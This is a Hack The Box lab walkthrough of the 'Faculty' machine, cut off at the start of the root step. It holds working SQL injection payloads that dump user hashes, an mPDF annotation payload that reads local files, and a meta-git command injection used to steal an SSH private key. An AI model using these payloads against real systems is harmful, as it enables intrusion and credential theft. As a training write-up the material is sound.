---
layout: post
title: Hack The Box Walkthrough - Faculty
date: 2022-10-22
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2022/10/HTB/Faculty
img: 2022/10/Faculty/Faculty.png
---

Really fun box where I had to exploit two injection vulnerabilities. Then exploit a vulnerable git client to get a user. And finally, use gdb to get root.

* Room: Faculty
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Faculty](https://app.hackthebox.com/machines/Faculty)
* Author: [gbyolo](https://app.hackthebox.com/users/36994)

## Enumeration

I began the box by enumerating the open ports.

```bash
$ rustscan -a target -- -v | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.220.57:22
Open 10.129.220.57:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 15:44 EDT
Initiating Ping Scan at 15:44
Scanning 10.129.220.57 [2 ports]
Completed Ping Scan at 15:44, 0.03s elapsed (1 total hosts)
Initiating Connect Scan at 15:44
Scanning target (10.129.220.57) [2 ports]
Discovered open port 22/tcp on 10.129.220.57
Discovered open port 80/tcp on 10.129.220.57
Completed Connect Scan at 15:44, 0.03s elapsed (2 total ports)
Nmap scan report for target (10.129.220.57)
Host is up, received syn-ack (0.025s latency).
Scanned at 2022-09-05 15:44:13 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
```
There were two open ports, 22 (SSH) and 80 (HTTP).

I opened the site in a browser and I got redirected to http://faculty.htb. I added `faculty.htb` to my hosts file and reloaded the site. I got redirected again, this time to a login page.

![Login Page](/assets/images/2022/10/Faculty/Login.png "Login Page")


I launched feroxbuster to check for hidden files.

```bash
$ feroxbuster -u http://faculty.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt -x php -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://faculty.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       12w      178c http://faculty.htb/admin => http://faculty.htb/admin/
302      GET      359l      693w        0c http://faculty.htb/ => login.php
302      GET      359l      693w        0c http://faculty.htb/index.php => login.php
200      GET      132l      235w        0c http://faculty.htb/login.php
500      GET        0l        0w        0c http://faculty.htb/test.php
200      GET       47l      106w        0c http://faculty.htb/header.php
200      GET       37l       84w        0c http://faculty.htb/topbar.php
301      GET        7l       12w      178c http://faculty.htb/mpdf => http://faculty.htb/mpdf/
[####################] - 1m    126176/126176  0s      found:8       errors:0
[####################] - 1m    126176/126176  1703/s  http://faculty.htb
```

It found an admin folder so I enumerated that also.

```bash
$ feroxbuster -u http://faculty.htb/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt -x php -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://faculty.htb/admin/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET      420l      809w        0c http://faculty.htb/admin/ => login.php
200      GET      175l      311w        0c http://faculty.htb/admin/login.php
302      GET      420l      809w        0c http://faculty.htb/admin/index.php => login.php
200      GET        0l        0w        0c http://faculty.htb/admin/ajax.php
200      GET      106l      167w        0c http://faculty.htb/admin/home.php
301      GET        7l       12w      178c http://faculty.htb/admin/assets => http://faculty.htb/admin/assets/
301      GET        7l       12w      178c http://faculty.htb/admin/database => http://faculty.htb/admin/database/
200      GET        1l        0w        0c http://faculty.htb/admin/download.php
200      GET       70l      105w        0c http://faculty.htb/admin/users.php
200      GET       47l      106w        0c http://faculty.htb/admin/header.php
500      GET       43l       88w        0c http://faculty.htb/admin/events.php
200      GET      218l      445w        0c http://faculty.htb/admin/courses.php
200      GET      201l      371w        0c http://faculty.htb/admin/schedule.php
200      GET      218l      372w        0c http://faculty.htb/admin/faculty.php
200      GET       28l       70w        0c http://faculty.htb/admin/navbar.php
200      GET        0l        0w        0c http://faculty.htb/admin/db_connect.php
200      GET      232l      458w        0c http://faculty.htb/admin/subjects.php
200      GET       37l       84w        0c http://faculty.htb/admin/topbar.php
200      GET       85l      162w        0c http://faculty.htb/admin/site_settings.php
[####################] - 1m    126176/126176  0s      found:19      errors:0
[####################] - 1m    126176/126176  1709/s  http://faculty.htb/admin/
```

## SQL Injection

When I loaded the home page, I was redirected to a login page. But there was some content returned with the index page, not just the redirect. I used Burp to intercept the response and change the redirect to a 200.

The page did not load correctly, but it made an AJAX request to `/admin/ajax.php?action=get_schecdule`. I sent the request to Burp Repeater and tested it for SQL Injection.

With a little bit of experimentation, I saw that it was vulnerable and that it was returning 12 fields.

```http
POST /admin/ajax.php?action=get_schecdule HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 57
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/
Cookie: PHPSESSID=4lpe4vc1uvnite9883dik90ml5

faculty_id=3 Union Select 1,2,3,4,5,6,7,8,9,10,11,12+--+-
```

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 05 Sep 2022 20:14:41 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 206

[{"id":"1","faculty_id":"2","title":"3","schedule_type":"4","description":"5","location":"6","is_repeating":"7","repeating_data":"8","schedule_date":"9","time_from":"10","time_to":"11","date_created":"12"}]
```

I used that vulnerability to extract information from the database.

I got the list of databases.

```
faculty_id=3 Union Select GROUP_CONCAT(SCHEMA_NAME),'b',3,4,5,6,7,8,9,10,11,12+From+information_schema.SCHEMATA+--+-


[{"id":"information_schema,scheduling_db","faculty_id":"b","title":"3","schedule_type":"4","description":"5","location":"6","is_repeating":"7","repeating_data":"8","schedule_date":"9","time_from":"10","time_to":"11","date_created":"12"}]
```


Then the tables in the `scheduling_db` database.

```
faculty_id=3 Union Select GROUP_CONCAT(TABLE_NAME),'b',3,4,5,6,7,8,9,10,11,12+From+information_schema.TABLES WHERE+TABLE_SCHEMA+%3d+'scheduling_db'+--+-

class_schedule_info,courses,faculty,schedules,subjects,users
```


And the list of columns in those tables.

```
faculty_id=3 Union Select GROUP_CONCAT(CONCAT(TABLE_NAME, '-',COLUMN_NAME)),'b',3,4,5,6,7,8,9,10,11,12+From+information_schema.COLUMNS WHERE+TABLE_SCHEMA+%3d+'scheduling_db'+--+-

class_schedule_info-course_id,class_schedule_info-id,class_schedule_info-schedule_id,class_schedule_info-subject,courses-course,courses-description,courses-id,faculty-address,faculty-contact,faculty-email,faculty-firstname,faculty-gender,faculty-id,faculty-id_no,faculty-lastname,faculty-middlename,schedules-date_created,schedules-description,schedules-faculty_id,schedules-id,schedules-is_repeating,schedules-location,schedules-repeating_data,schedules-schedule_date,schedules-schedule_type,schedules-time_from,schedules-time_to,schedules-title,subjects-description,subjects-id,subjects-subject,users-id,users-name,users-password,users-type,users-username
```

```
# class_schedule_info
course_id
id
schedule_id
subject

# courses
course
description
id

# faculty
address
contact
email
firstname
gender
id
id_no
lastname
middlename

# schedules
date_created
description
faculty_id
id
is_repeating
location
repeating_data
schedule_date
schedule_type
time_from
time_to
title

# subjects
description
id
subject

# users
id
name
password
type
username
```

I saw a `users` table, so I extracted the data it contained.

```
faculty_id=3 Union Select GROUP_CONCAT(CONCAT(username, '-',password)),'b',3,4,5,6,7,8,9,10,11,12+From+users+--+-

[{"id":"admin-1fecbe762af147c1176a0fc2c722a345","faculty_id":"b","title":"3","schedule_type":"4","description":"5","location":"6","is_repeating":"7","repeating_data":"8","schedule_date":"9","time_from":"10","time_to":"11","date_created":"12"}]
```

I found a password that was hashed. So I used hashcat to try to crack it.

```bash
$ hashcat -a0 -m0 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2873/5810 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: 1fecbe762af147c1176a0fc2c722a345
Time.Started.....: Mon Sep  5 16:33:26 2022 (2 secs)
Time.Estimated...: Mon Sep  5 16:33:28 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5920.3 kH/s (0.13ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[21217365786d652121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 27%

Started: Mon Sep  5 16:33:25 2022
Stopped: Mon Sep  5 16:33:30 2022
```

It failed. I kept looking in the database. There was a faculty table, and the login page was requesting a Faculty ID.

```
faculty_id=3 Union Select GROUP_CONCAT(CONCAT(id, '-',id_no)),'b',3,4,5,6,7,8,9,10,11,12+From+faculty+--+-

[{"id":"1-FACULTY_ID_1,2-FACULTY_ID_2,3-FACULTY_ID_3","faculty_id":"b","title":"3","schedule_type":"4","description":"5","location":"6","is_repeating":"7","repeating_data":"8","schedule_date":"9","time_from":"10","time_to":"11","date_created":"12"}]
```

I used the first faculty id to connect to the site.

## PDF Injection

Once connected, I was on a page with a calendar.

![Calendar](/assets/images/2022/10/Faculty/Calendar.png "Calendar")

There was nothing else on that site. I tried going to '/admin' and I was connected there also.

![Admin Section](/assets/images/2022/10/Faculty/AdminSection.png "Admin Section")

I looked around the admin section. The 'Course List' page had a button to download a PDF of the courses.

![Course List](/assets/images/2022/10/Faculty/CourseList.png "Course List")

When I clicked on the button, I got a PDF containing the list of courses.

I looked at the POST request. The payload was URL encoded twice, and Base64 encoded. I decoded it, and it contained the HTML that was used to generate the PDF.

```http
POST /admin/download.php HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 2612
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/admin/index.php?page=courses
Cookie: PHPSESSID=f8l4as9cm4ur2gl1sgsihbk2ta

pdf=JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VDb3Vyc2VzJTI1M0MlMjUyRmgyJTI1M0UlMjUzQ3RhYmxlJTI1M0UlMjUwOSUyNTNDdGhlYWQlMjUzRSUyNTA5JTI1MDklMjUzQ3RyJTI1M0UlMjUwOSUyNTA5JTI1MDklMjUzQ3RoJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1MjMlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VDb3Vyc2UlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VEZXNjcmlwdGlvbiUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0MlMjUyRnRyJTI1M0UlMjUzQyUyNTJGdGhlYWQlMjUzRSUyNTNDdGJvZHklMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UxJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VJbmZvcm1hdGlvbiUyQlRlY2hub2xvZ3klMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VJVCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFMiUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFQlNDUyUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRUJhY2hlbG9yJTJCb2YlMkJTY2llbmNlJTJCaW4lMkJDb21wdXRlciUyQlNjaWVuY2UlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnNtYWxsJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0N0ciUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRTMlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ2IlMjUzRUJTSVMlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VCYWNoZWxvciUyQm9mJTJCU2NpZW5jZSUyQmluJTJCSW5mb3JtYXRpb24lMkJTeXN0ZW1zJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0U0JTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VCU0VEJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFQmFjaGVsb3IlMkJpbiUyQlNlY29uZGFyeSUyQkVkdWNhdGlvbiUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQyUyNTJGdGJvYnklMjUzRSUyNTNDJTI1MkZ0YWJsZSUyNTNF
```

And the response contained the file name to download.

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 11 Sep 2022 14:21:39 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 47

OKcpdk84zixOJH0XFYS259sBCN.pdf
```

The URL of the file to download contained mPDF. I looked for this [library](https://mpdf.github.io/). And for vulnerabilities. I found that it was vulnerable to [Local File Inclusion](https://www.exploit-db.com/exploits/50995).

I took the payload from ExploitDB.

```xml
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

I created an HTML payload to send to the PDF generator.

```html
<h1><a name="top"></a>faculty.htb</h1><h2>Courses</h2><table>
<thead>
<tr><th class="text-center">#</th>
<th class="text-center">Course</th>			
<th class="text-center">Description</th>			</tr>
</thead>
<tbody>
<tr>
<td class="text-center">1</td>
<td class="text-center"><b>INJECTED</b></td>
<td class="text-center">
<annotation file="index.php" content="index.php" icon="Graph" title="Attached File" pos-x="195" />
</td>
</tr>
</tboby>
</table>
```

Then I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')) to encode it as the site was expecting.

I sent the payload to the server and got a file back. I opened it in Firefox and the place where it should have contained the file was empty. It looked like the payload was interpreted since it was not returned. But the file was not there. I tried multiple files. With absolute and relative paths. But nothing worked.

It took me a while to realize that the file content was supposed to be in an annotation of the PDF. And Firefox was not showing the annotation.

I downloaded the file and opened it with a fat client.

![Annotation](/assets/images/2022/10/Faculty/Annotation.png "Annotation")

The annotation was there. I clicked on it and got the content of the file I was trying to extract.

I used that vulnerability to get the `/etc/passwd` file.

```
...
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
...
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

The server had two users that could connect to it in addition to root.

I started extracting the PHP file. I found a file called `db_connect.php` that contained some credentials.

```php
<?php

$conn= new mysqli('localhost','sched','REDACTED','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

I tried the password in SSH.

```bash
$ ssh gbyolo@target
The authenticity of host 'target (10.129.55.0)' can't be established.
ED25519 key fingerprint is SHA256:JYKRgj5yk9qD3GxSCsRAgUIBAhmTssq961F3rHxWlnY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
gbyolo@target's password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep 11 16:45:30 CEST 2022

  System load:           0.0
  Usage of /:            74.9% of 4.67GB
  Memory usage:          34%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.129.55.0
  IPv6 address for eth0: dead:beef::250:56ff:feb9:9602


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
```

I was in.

## Lateral Movement

When I connected, I got a message that said I had mail. So I read the email.

```bash
gbyolo@faculty:~$ mail
"/var/mail/gbyolo": 1 message 1 unread
>U   1 developer@faculty. Tue Nov 10 15:03  16/623   Faculty group
?
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
        id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```

It said I could manage the git repositories. I looked at what I could do with sudo.

```bash
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo:
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

I was able to run [meta-git](https://www.npmjs.com/package/meta-git) as developer. I had never heard about meta-git before. But it was simply a NPM abstraction around git. I tried to use it, but I was not in a meta repository. And I did not know where I could find one. I looked on the server for `.git` folders and did not find any.

Next, I looked for vulnerabilities in meta git and found on in [HackerOne](https://hackerone.com/reports/728040). Cloning a repository allowed to get remote code execution by using `||` (or) in the repository name.

I tried the example from HackerOne, but I had to make sure the current folder was writeable by developer.

```bash
gbyolo@faculty:~$ mkdir /tmp/test
gbyolo@faculty:~$ chmod 777 /tmp/test
gbyolo@faculty:~$ cd /tmp/test
gbyolo@faculty:/tmp/test$ touch test
gbyolo@faculty:/tmp/test$ touch secret
gbyolo@faculty:/tmp/test$ touch files
gbyolo@faculty:/tmp/test$ sudo -u developer meta-git clone 'sss||touch HACKED'
[sudo] password for gbyolo:
meta git cloning into 'sss||touch HACKED' at sss||touch HACKED

sss||touch HACKED:
fatal: repository 'sss' does not exist
sss||touch HACKED ✓
(node:1957) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/tmp/test/sss||touch HACKED'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:1957) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:1957) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.

gbyolo@faculty:/tmp/test$ ls
HACKED  files  secret  sss  test
```

It threw an error. But the HACKED file was created. I had code execution.

I looked for a private key in developer's home folder.

```bash
gbyolo@faculty:/tmp/test$ sudo -u developer meta-git clone 'sss||ls -la /home/developer/.ssh > res.txt'
meta git cloning into 'sss||ls -la /home/developer/.ssh > res.txt' at .ssh > res.txt

.ssh > res.txt:
fatal: destination path 'sss' already exists and is not an empty directory.
ls: cannot access '.ssh': No such file or directory
.ssh > res.txt: command 'git clone sss||ls -la /home/developer/.ssh > res.txt .ssh > res.txt' exited with error: Error: Command failed: git clone sss||ls -la /home/developer/.ssh > res.txt .ssh > res.txt
...

gbyolo@faculty:/tmp/test$ cat res.txt
/home/developer/.ssh:
total 20
drwxr-xr-x 2 developer developer 4096 Jun 23 18:50 .
drwxr-x--- 6 developer developer 4096 Jun 27 19:18 ..
-rw-r--r-- 1 developer developer  571 Jun 22 08:51 authorized_keys
-rw------- 1 developer developer 2602 Jun 22 08:51 id_rsa
-rw-r--r-- 1 developer developer  571 Jun 22 08:51 id_rsa.pub
```

There was one. I used the same technique to read it.

```bash
gbyolo@faculty:/tmp/test$ sudo -u developer meta-git clone 'sss||cat /home/developer/.ssh/id_rsa > res.txt'
meta git cloning into 'sss||cat /home/developer/.ssh/id_rsa > res.txt' at id_rsa > res.txt

id_rsa > res.txt:
fatal: destination path 'sss' already exists and is not an empty directory.
cat: id_rsa: No such file or directory
id_rsa > res.txt: command 'git clone sss||cat /home/developer/.ssh/id_rsa > res.txt id_rsa > res.txt' exited with error: Error: Command failed: git clone sss||cat /home/developer/.ssh/id_rsa > res.txt id_rsa > res.txt
(node:2123) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/tmp/test/id_rsa > res.txt'
...

gbyolo@faculty:/tmp/test$ cat res.txt
-----BEGIN OPENSSH PRIVATE KEY-----
REDACTED
-----END OPENSSH PRIVATE KEY-----
```

I copied the key on my machine and used it to connect back as developer.

```bash
$ vim dev_id_rsa

$ chmod 600 dev_id_rsa

$ ssh -i dev_id_rsa developer@target
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep 11 17:21:37 CEST 2022

  System load:           0.0
  Usage of /:            75.0% of 4.67GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             231
  Users logged in:       1
  IPv4 address for eth0: 10.129.55.0
  IPv6 address for eth0: dead:beef::250:56ff:feb9:9602

...

developer@faculty:~$ cat user.txt
REDACTED
```

## Privilege Escalation

I started looking for a way to get root. I could not run sudo since I did not have the password for developer. There was a script in the home folder, but it was just sending the email I saw earlier.

I looked at the groups I was in. I was in three groups. I looked for files belonging to those groups.

```bash
developer@faculty:~$ groups
developer debug faculty

developer@faculty:~$ find / -group debug 2>/dev/null
/usr/bin/gdb

eveloper@faculty:~$ ls -l /usr/bin/gdb
-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb

developer@faculty:~$ getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace+ep
```

The group debug was able to run [GDB](https://www.sourceware.org/gdb/). The file did not have the suid bit set. But it had the [cap_sys_ptrace](https://man7.org/linux/man-pages/man7/capabilities.7.html) capabilities.

From the documentation, I saw that this capability allowed to trace arbitrary processes.

```
CAP_SYS_PTRACE
   * Trace arbitrary processes using ptrace(2);
   * apply get_robust_list(2) to arbitrary processes;
   * transfer data to or from the memory of arbitrary
      processes using process_vm_readv(2) and
      process_vm_writev(2);
   * inspect processes using kcmp(2).
```

I looked for a process running as root that I could hook into.

```bash
developer@faculty:~$ ps aux --forest
...
root         910  0.0  0.1   5568  2992 ?        Ss   18:09   0:00 /usr/sbin/cron -f
root         915  0.0  0.1   7248  3328 ?        S    18:09   0:00  \_ /usr/sbin/CRON -f
root         933  0.0  0.0   2608   532 ?        Ss   18:09   0:00      \_ /bin/sh -c bash /root/service_check.sh
